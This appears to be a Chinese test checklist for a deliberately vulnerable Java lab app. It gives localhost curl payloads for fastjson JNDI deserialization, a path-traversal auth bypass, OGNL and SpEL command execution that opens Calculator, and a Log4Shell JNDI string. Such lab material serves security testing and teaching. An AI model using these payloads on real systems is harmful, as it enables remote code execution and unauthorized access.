1. 测试/actuator接口

2. 测试fastjson漏洞
   curl 127.0.0.1:8080/fastjson/parse -d 'json={"@type":"org.apache.commons.proxy.provider.remoting.RmiProvider","host":"127.0.0.1",port:"1099","name":"Exploit"}'
   curl 127.0.0.1:8080/fastjson/parse -d 'json={"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1389/Exploit","autoCommit":true}'

3. 测试 alwaysUseFullPath 认证绕过漏洞
   http://rui0.cn/archives/1643

   直接访问 /admin/auth 会提示认证失败
   使用 /admin/no-auth/%2e%2e/auth 可以绕过认证

4. 测试ognl执行
   curl 127.0.0.1:8080/ognl/parse -d 'ognl=#a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{"open", "/System/Applications/Calculator.app/"})).start()'

5. 测试spel执行
   curl 127.0.0.1:8080/spel/parse -d "spel=T(java.lang.Runtime).getRuntime().exec('open /System/Applications/Calculator.app')"

6. 测试log4j漏洞
   curl http://127.0.0.1:8080/log4j?log=%24%7Bjndi:ldap://127.0.0.1:1099/a%7D
